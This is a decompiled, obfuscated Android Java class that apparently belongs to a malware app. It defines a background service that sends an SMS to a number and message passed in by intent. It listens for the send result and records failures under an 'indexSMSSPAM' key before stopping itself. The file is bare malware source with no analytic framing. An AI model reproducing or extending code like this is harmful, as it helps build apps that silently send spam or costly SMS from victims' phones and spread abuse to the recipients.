package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class dshd extends Service {

    /* JADX INFO: renamed from: a */
    Context f517a;

    /* JADX INFO: renamed from: b */
    C0020b f518b = new C0020b();

    /* JADX INFO: renamed from: c */
    BroadcastReceiver f519c = new BroadcastReceiver() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.dxivifswvkcvwz.dshd.1
        /* JADX WARN: Unreachable blocks removed: 1, instructions: 1 */
        @Override // android.content.BroadcastReceiver
        public void onReceive(Context context, Intent intent) {
            C0020b c0020b;
            String str;
            String str2;
            if (getResultCode() != -1) {
                dshd.this.f518b.m230a("S", "Error SMS SENT");
                c0020b = dshd.this.f518b;
                str = "indexSMSSPAM";
                str2 = dshd.this.f518b.m251e(context, "indexSMSSPAM") + "|";
            } else {
                dshd.this.f518b.m230a("S", "SMS SENT");
                c0020b = dshd.this.f518b;
                str = "indexSMSSPAM";
                str2 = "";
            }
            c0020b.m250d(context, str, str2);
            dshd.this.unregisterReceiver(dshd.this.f519c);
            dshd.this.stopSelf();
        }
    };

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
    }

    @Override // android.app.Service
    public void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int i, int i2) {
        this.f517a = this;
        this.f518b.m245c(this, intent.getStringExtra("number"), intent.getStringExtra("msg"));
        registerReceiver(this.f519c, new IntentFilter("SMS_SENT"));
        return 2;
    }
}
